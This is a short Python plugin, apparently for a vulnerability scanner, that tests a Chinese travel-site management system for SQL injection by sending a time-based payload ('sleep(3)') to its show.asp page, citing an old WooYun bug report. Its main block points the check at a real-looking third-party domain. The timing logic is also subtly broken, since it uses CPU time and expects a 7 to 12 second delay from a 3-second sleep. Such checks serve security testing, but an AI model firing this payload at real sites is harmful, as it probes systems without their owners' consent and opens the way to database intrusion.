#!/usr/bin/env python
# -*- coding: utf-8 -*-
# TOUR旅游网站管理系统SQL注入漏洞
# 参考：http://www.wooyun.org/bugs/wooyun-2014-057623

from time import clock

def assign(service, arg):
    if service == "Tour":
        return True, arg

def audit(arg):
    url = arg + '/line/show.asp?id=926%27%20and%20sleep%283%29--%201'
    start = clock()
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200:
        if res.find('<script language=javascript>alert') != -1 or clock()-start in range(7, 12):
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('Tour', 'http://www.qdcqly.com')[1])